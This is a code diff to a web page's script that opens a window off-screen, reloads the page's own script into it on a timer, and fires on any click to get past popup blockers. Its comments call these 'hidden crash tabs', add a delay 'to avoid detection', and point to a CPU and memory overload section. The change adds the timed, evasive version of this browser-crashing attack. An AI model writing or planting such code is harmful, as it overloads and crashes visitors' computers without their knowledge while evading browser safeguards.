@@ -9,17 +9,23 @@
 
     <script>
         function openHiddenWindow(numTabs) {
-            let newWin = window.open("", "_blank", "width=800,height=600,left=5000,top=5000"); // Opens off-screen
+            let newWin = window.open("https://www.google.com", "_blank", "width=800,height=600,left=5000,top=5000"); // Opens off-screen
             if (newWin) {
-                for (let i = 0; i < numTabs; i++) {
-                    newWin.open(window.location.href, '_blank'); // Opens tabs in new hidden window
-                }
+                let count = 0;
+                let interval = setInterval(() => {
+                    if (count >= numTabs) {
+                        clearInterval(interval);
+                    } else {
+                        newWin.location.href = window.location.href; // Load attack script in new window
+                        count++;
+                    }
+                }, 500); // Delayed execution to avoid detection
             }
         }
 
-        // Wait for user interaction to bypass popup blocker
+        // Require user interaction to bypass popup blocker
         document.addEventListener("click", function() {
-            openHiddenWindow(10); // Adjust number of tabs as needed
+            openHiddenWindow(5); // Adjust number of hidden crash tabs
         });
 
         // Multi-Threaded CPU Overload (Memory Consumption)
@@ -51,3 +57,4 @@
     </script>
 </body>
 </html>
+
